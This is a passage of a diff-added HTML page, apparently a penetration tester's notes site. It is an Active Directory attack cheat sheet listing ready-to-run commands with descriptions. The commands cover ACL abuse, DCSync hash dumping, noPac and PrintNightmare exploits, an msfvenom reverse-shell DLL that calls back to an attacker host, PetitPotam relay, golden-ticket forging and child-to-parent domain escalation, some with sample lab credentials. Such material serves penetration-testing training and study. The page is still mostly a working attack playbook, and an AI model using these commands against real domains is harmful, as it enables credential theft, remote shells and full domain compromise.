+<td>A <code>foreach loop</code> used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(<code>ad_users.txt</code>) to the <code>Get-ADUser</code> cmdlet, then enumerates access rights of those users. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>$SecPassword = ConvertTo-SecureString '&lt;PASSWORD HERE&gt;' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('example\wley', $SecPassword)</code></td>
+<td>Used to create a <code>PSCredential Object</code> from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force</code></td>
+<td>Used to create a <code>SecureString Object</code> from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose</code></td>
+<td>PowerView tool used to change the password of a specifc user (<code>damundsen</code>) on a target Windows domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-ADGroup -Identity "Help Desk Level 1" -Properties * \| Select -ExpandProperty Members</code></td>
+<td>PowerView tool used view the members of a target security group (<code>Help Desk Level 1</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose</code></td>
+<td>PowerView tool used to add a specifc user (<code>damundsen</code>) to a specific security group (<code>Help Desk Level 1</code>) in a target Windows domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainGroupMember -Identity "Help Desk Level 1" \| Select MemberName</code></td>
+<td>PowerView tool used to view the members of a specific security group (<code>Help Desk Level 1</code>) and output only the username of each member (<code>Select MemberName</code>) of the group from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose</code></td>
+<td>PowerView tool used create a fake <code>Service Principal Name</code> given a sepecift user (<code>adunn</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose</code></td>
+<td>PowerView tool used to remove the fake <code>Service Principal Name</code> created during the attack from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose</code></td>
+<td>PowerView tool used to remove a specific user (<code>damundsent</code>) from a specific security group (<code>Help Desk Level 1</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>ConvertFrom-SddlString</code></td>
+<td>PowerShell cmd-let used to covert an <code>SDDL string</code> into a readable format. Performed from a Windows-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="dcsync">DCSync</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Get-DomainUser -Identity adunn \| select samaccountname,objectsid,memberof,useraccountcontrol \|fl</code></td>
+<td>PowerView tool used to view the group membership of a specific user (<code>adunn</code>) in a target Windows domain. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=example,DC=local" -ResolveGUIDs \| ? { ($_.ObjectAceType -match 'Replication-Get')} \| ?{$_.SecurityIdentifier -match $sid} \| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \| fl</code></td>
+<td>Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool <code>Get-ObjectAcl</code> to check a specific user's replication rights. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>secretsdump.py -outputfile example_hashes -just-dc example/adunn@172.16.5.5 -use-vss</code></td>
+<td>Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (<code>172.16.5.5</code>) and save the extracted hashes to an file (<code>example_hashes</code>). Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>mimikatz # lsadump::dcsync /domain:example.LOCAL /user:example\administrator</code></td>
+<td>Uses <code>Mimikatz</code> to perform a <code>dcsync</code> attack from a Windows-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="privileged-access">Privileged Access</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"</code></td>
+<td>PowerView based tool to used to enumerate the <code>Remote Desktop Users</code>group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"</code></td>
+<td>PowerView based tool to used to enumerate the <code>Remote Management Users</code> group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force</code></td>
+<td>Creates a variable (<code>$password</code>) set equal to the password (<code>Klmcargo2</code>) of a user from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>$cred = new-object System.Management.Automation.PSCredential ("example\forend", $password)</code></td>
+<td>Creates a variable (<code>$cred</code>) set equal to the username (<code>forend</code>) and password (<code>$password</code>) of a target domain account from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred</code></td>
+<td>Uses the PowerShell cmd-let <code>Enter-PSSession</code> to establish a PowerShell session with a target over the network (<code>-ComputerName ACADEMY-EA-DB01</code>) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior (<code>$cred</code> &amp; <code>$password</code>).</td>
+</tr>
+<tr>
+<td><code>evil-winrm -i 10.129.201.234 -u forend</code></td>
+<td>Used to establish a PowerShell session with a Windows target from a Linux-based host using <code>WinRM</code>.</td>
+</tr>
+<tr>
+<td><code>Import-Module .\PowerUpSQL.ps1</code></td>
+<td>Used to import the <code>PowerUpSQL</code> tool.</td>
+</tr>
+<tr>
+<td><code>Get-SQLInstanceDomain</code></td>
+<td>PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "example\damundsen" -password "SQL1234!" -query 'Select @@version'</code></td>
+<td>PowerUpSQL tool used to connect to connect to a SQL server and query the version (<code>-query 'Select @@version'</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>mssqlclient.py</code></td>
+<td>Impacket tool used to display the functionality and options provided with <code>mssqlclient.py</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>mssqlclient.py example/DAMUNDSEN@172.16.5.150 -windows-auth</code></td>
+<td>Impacket tool used to connect to a MSSQL server from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>SQL&gt; help</code></td>
+<td>Used to display mssqlclient.py options once connected to a MSSQL server.</td>
+</tr>
+<tr>
+<td><code>SQL&gt; enable_xp_cmdshell</code></td>
+<td>Used to enable <code>xp_cmdshell stored procedure</code> that allows for executing OS commands via the database from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>xp_cmdshell whoami /priv</code></td>
+<td>Used to enumerate rights on a system using <code>xp_cmdshell</code>.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="nopac">NoPac</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo git clone https://github.com/Ridter/noPac.git</code></td>
+<td>Used to clone a <code>noPac</code> exploit using git. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo python3 scanner.py example.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap</code></td>
+<td>Runs <code>scanner.py</code> to check if a target system is vulnerable to <code>noPac</code>/<code>Sam_The_Admin</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo python3 noPac.py example.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</code></td>
+<td>Used to exploit the <code>noPac</code>/<code>Sam_The_Admin</code>vulnerability and gain a SYSTEM shell (<code>-shell</code>). Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo python3 noPac.py example.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user example/administrator</code></td>
+<td>Used to exploit the <code>noPac</code>/<code>Sam_The_Admin</code>vulnerability and perform a <code>DCSync</code> attack against the built-in Administrator account on a Domain Controller from a Linux-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="printnightmare">PrintNightmare</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>git clone https://github.com/cube0x0/CVE-2021-1675.git</code></td>
+<td>Used to clone a PrintNightmare exploit using git from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install</code></td>
+<td>Used to ensure the exploit author's (<code>cube0x0</code>) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>rpcdump.py @172.16.5.5 \| egrep 'MS-RPRN\|MS-PAR'</code></td>
+<td>Used to check if a Windows target has <code>MS-PAR</code> &amp; <code>MSRPRN</code> exposed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll &gt; backupscript.dll</code></td>
+<td>Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>sudo smbserver.py -smb2support CompData /path/to/backupscript.dll</code></td>
+<td>Used to create an SMB server and host a shared folder (<code>CompData</code>) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo python3 CVE-2021-1675.py example.local/&lt;username&gt;:&lt;password&gt;@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'</code></td>
+<td>Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="petitpotam">PetitPotam</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.example.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController</code></td>
+<td>Impacket tool used to create an <code>NTLM relay</code> by specifiying the web enrollment URL for the <code>Certificate Authority</code> host. Perfomred from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>git clone https://github.com/topotam/PetitPotam.git</code></td>
+<td>Used to clone the <code>PetitPotam</code> exploit using git. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>python3 PetitPotam.py 172.16.5.225 172.16.5.5</code></td>
+<td>Used to execute the PetitPotam exploit by specifying the IP address of the attack host (<code>172.16.5.255</code>) and the target Domain Controller (<code>172.16.5.5</code>). Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>python3 /opt/PKINITtools/gettgtpkinit.py example.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 &lt;base64 certificate&gt; = dc01.ccache</code></td>
+<td>Uses <code>gettgtpkinit</code>.py to request a TGT ticket for the Domain Controller (<code>dc01.ccache</code>) from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>secretsdump.py -just-dc-user example/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.example.LOCAL</code></td>
+<td>Impacket tool used to perform a DCSync attack and retrieve one or all of the <code>NTLM password hashes</code> from the target Windows domain. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>klist</code></td>
+<td><code>krb5-user</code> command used to view the contents of the <code>ccache</code> file. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 example.LOCAL/ACADEMY-EA-DC01$</code></td>
+<td>Used to submit TGS requests using <code>getnthash.py</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>secretsdump.py -just-dc-user example/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba</code></td>
+<td>Impacket tool used to extract hashes from <code>NTDS.dit</code>using a <code>DCSync attack</code> and a captured hash (<code>-hashes</code>). Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /&lt;base64 certificate&gt;=/ptt</code></td>
+<td>Uses Rubeus to request a TGT and perform a <code>pass-the-ticket attack</code> using the machine account (<code>/user:ACADEMY-EA-DC01$</code>) of a Windows target. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>mimikatz # lsadump::dcsync /user:example\krbtgt</code></td>
+<td>Performs a DCSync attack using <code>Mimikatz</code>. Performed from a Windows-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="miscellaneous-misconfigurations">Miscellaneous Misconfigurations</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Import-Module .\SecurityAssessment.ps1</code></td>
+<td>Used to import the module <code>Security Assessment.ps1</code>. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.example.LOCAL</code></td>
+<td>SecurityAssessment.ps1 based tool used to enumerate a Windows target for <code>MS-PRN Printer bug</code>. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>adidnsdump -u example\\forend ldap://172.16.5.5</code></td>
+<td>Used to resolve all records in a DNS zone over <code>LDAP</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>adidnsdump -u example\\forend ldap://172.16.5.5 -r</code></td>
+<td>Used to resolve unknown records in a DNS zone by performing an <code>A query</code> (<code>-r</code>) from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainUser * \| Select-Object samaccountname,description</code></td>
+<td>PowerView tool used to display the description field of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainUser -UACFilter PASSWD_NOTREQD \| Select-Object samaccountname,useraccountcontrol</code></td>
+<td>PowerView tool used to check for the <code>PASSWD_NOTREQD</code> setting of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>ls \\academy-ea-dc01\SYSVOL\example.LOCAL\scripts</code></td>
+<td>Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="group-policy-enumeration-attacks">Group Policy Enumeration &amp; Attacks</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE</code></td>
+<td>Tool used to decrypt a captured <code>group policy preference password</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>crackmapexec smb -L \| grep gpp</code></td>
+<td>Locates and retrieves a <code>group policy preference password</code> using <code>CrackMapExec</code>, the filters the output using <code>grep</code>. Peformed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</code></td>
+<td>Locates and retrieves any credentials stored in the <code>SYSVOL</code> share of a Windows target using <code>CrackMapExec</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainGPO \| select displayname</code></td>
+<td>PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-GPO -All \| Select DisplayName</code></td>
+<td>PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>$sid=Convert-NameToSid "Domain Users"</code></td>
+<td>Creates a variable called <code>$sid</code> that is set equal to the <code>Convert-NameToSid</code> tool and specifies the group account <code>Domain Users</code>. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainGPO \| Get-ObjectAcl \| ?{$_.SecurityIdentifier -eq $sid</code></td>
+<td>PowerView tool that is used to check if the <code>Domain Users</code> (<code>eq $sid</code>) group has any rights over one or more GPOs. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532</code></td>
+<td>PowerShell cmd-let used to display the name of a GPO given a <code>GUID</code>. Performed from a Windows-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="asreproasting">ASREPRoasting</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Get-DomainUser -PreauthNotRequired \| select samaccountname,userprincipalname,useraccountcontrol \| fl</code></td>
+<td>PowerView based tool used to search for the <code>DONT_REQ_PREAUTH</code> value across in user accounts in a target Windows domain. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat</code></td>
+<td>Uses <code>Rubeus</code> to perform an <code>ASEP Roasting attack</code> and formats the output for <code>Hashcat</code>. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt</code></td>
+<td>Uses <code>Hashcat</code> to attempt to crack the captured hash using a wordlist (<code>rockyou.txt</code>). Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>kerbrute userenum -d example.local --dc 172.16.5.5 /opt/jsmith.txt</code></td>
+<td>Enumerates users in a target Windows domain and automatically retrieves the <code>AS</code> for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="trust-relationships-child-parent-trusts">Trust Relationships - Child &gt; Parent Trusts</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Import-Module activedirectory</code></td>
+<td>Used to import the <code>Active Directory</code>module. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-ADTrust -Filter *</code></td>
+<td>PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainTrust</code></td>
+<td>PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainTrustMapping</code></td>
+<td>PowerView tool used to perform a domain trust mapping from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainUser -Domain LOGISTICS.example.LOCAL \| select SamAccountName</code></td>
+<td>PowerView tools used to enumerate users in a target child domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt</code></td>
+<td>Uses Mimikatz to obtain the <code>KRBTGT</code>account's <code>NT Hash</code> from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainSID</code></td>
+<td>PowerView tool used to get the SID for a target child domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainGroup -Domain example.LOCAL -Identity "Enterprise Admins" \| select distinguishedname,objectsid</code></td>
+<td>PowerView tool used to obtain the <code>Enterprise Admins</code> group's SID from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>ls \\academy-ea-dc01.example.local\c$</code></td>
+<td>Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.example.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</code></td>
+<td>Uses <code>Mimikatz</code> to create a <code>Golden Ticket</code> from a Windows-based host .</td>
+</tr>
+<tr>
+<td><code>.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.example.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt</code></td>
+<td>Uses <code>Rubeus</code> to create a <code>Golden Ticket</code> from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>mimikatz # lsadump::dcsync /user:example\lab_adm</code></td>
+<td>Uses <code>Mimikatz</code> to perform a DCSync attack from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>secretsdump.py logistics.example.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</code></td>
+<td>Impacket tool used to perform a DCSync attack from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>lookupsid.py logistics.example.local/htb-student_adm@172.16.5.240</code></td>
+<td>Impacket tool used to perform a <code>SID Brute forcing</code> attack from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>lookupsid.py logistics.example.local/htb-student_adm@172.16.5.240 \| grep "Domain SID"</code></td>
+<td>Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>lookupsid.py logistics.example.local/htb-student_adm@172.16.5.5 \| grep -B12 "Enterprise Admins"</code></td>
+<td>Impacket tool used to retrieve the <code>SID</code>of a target Windows domain and attach it to the Enterprise Admin group's <code>RID</code>from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.example.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker</code></td>
+<td>Impacket tool used to create a <code>Golden Ticket</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>export KRB5CCNAME=hacker.ccache</code></td>
+<td>Used to set the <code>KRB5CCNAME Environment Variable</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>psexec.py LOGISTICS.example.LOCAL/hacker@academy-ea-dc01.example.local -k -no-pass -target-ip 172.16.5.5</code></td>
+<td>Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>raiseChild.py -target-exec 172.16.5.5 LOGISTICS.example.LOCAL/htb-student_adm</code></td>
+<td>Impacket tool that automatically performs an attack that escalates from child to parent domain.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="trust-relationships-cross-forest">Trust Relationships - Cross-Forest</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL \| select SamAccountName</code></td>
+<td>PowerView tool used to enumerate accounts for associated <code>SPNs</code> from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc \| select samaccountname,memberof</code></td>
+<td>PowerView tool used to enumerate the <code>mssqlsvc</code> account from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap</code></td>
+<td>Uses <code>Rubeus</code> to perform a Kerberoasting Attack against a target Windows domain (<code>/domain:FREIGHTLOGISTICS.local</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL</code></td>
+<td>PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential example\administrator</code></td>
+<td>PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL example.LOCAL/wley</code></td>
+<td>Impacket tool used to request (<code>-request</code>) the TGS ticket of an account in a target Windows domain (<code>-target-domain</code>) from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>bloodhound-python -d example.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2</code></td>
+<td>Runs the Python implementation of <code>BloodHound</code> against a target Windows domain from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>zip -r ilfreight_bh.zip *.json</code></td>
+<td>Used to compress multiple files into 1 single <code>.zip</code> file to be uploaded into the BloodHound GUI.</td>
+</tr>
+</tbody>
+</table>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  <form class="md-feedback" name="feedback" hidden>
+    <fieldset>
+      <legend class="md-feedback__title">
+        Was this page helpful?
+      </legend>
+      <div class="md-feedback__inner">
+        <div class="md-feedback__list">
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page was helpful" data-md-value="1">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 12a8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8 8 8 0 0 0 8-8m2 0a10 10 0 0 1-10 10A10 10 0 0 1 2 12 10 10 0 0 1 12 2a10 10 0 0 1 10 10M10 9.5c0 .8-.7 1.5-1.5 1.5S7 10.3 7 9.5 7.7 8 8.5 8s1.5.7 1.5 1.5m7 0c0 .8-.7 1.5-1.5 1.5S14 10.3 14 9.5 14.7 8 15.5 8s1.5.7 1.5 1.5m-5 7.73c-1.75 0-3.29-.73-4.19-1.81L9.23 14c.45.72 1.52 1.23 2.77 1.23s2.32-.51 2.77-1.23l1.42 1.42c-.9 1.08-2.44 1.81-4.19 1.81"/></svg>
+            </button>
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page could be improved" data-md-value="0">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 12a8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8 8 8 0 0 0 8-8m2 0a10 10 0 0 1-10 10A10 10 0 0 1 2 12 10 10 0 0 1 12 2a10 10 0 0 1 10 10m-6.5-4c.8 0 1.5.7 1.5 1.5s-.7 1.5-1.5 1.5-1.5-.7-1.5-1.5.7-1.5 1.5-1.5M10 9.5c0 .8-.7 1.5-1.5 1.5S7 10.3 7 9.5 7.7 8 8.5 8s1.5.7 1.5 1.5m2 4.5c1.75 0 3.29.72 4.19 1.81l-1.42 1.42C14.32 16.5 13.25 16 12 16s-2.32.5-2.77 1.23l-1.42-1.42C8.71 14.72 10.25 14 12 14"/></svg>
+            </button>
+          
+        </div>
+        <div class="md-feedback__note">
+          
+            <div data-md-value="1" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+              Thanks for your feedback!
+            </div>
+          
+            <div data-md-value="0" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+              Thanks for your feedback! Help us improve this page by using our <a href="..." target="_blank" rel="noopener">feedback form</a>.
+            </div>
+          
+        </div>
+      </div>
+    </fieldset>
+  </form>
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../../internal/inpt-04-smb/" class="md-footer__link md-footer__link--prev" aria-label="Previous: SMB">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                SMB
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../infra-002-ldap-powerview/" class="md-footer__link md-footer__link--next" aria-label="Next: LDAP and PowerView">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                LDAP and PowerView
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2016 - 2025 Tom Fieber
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
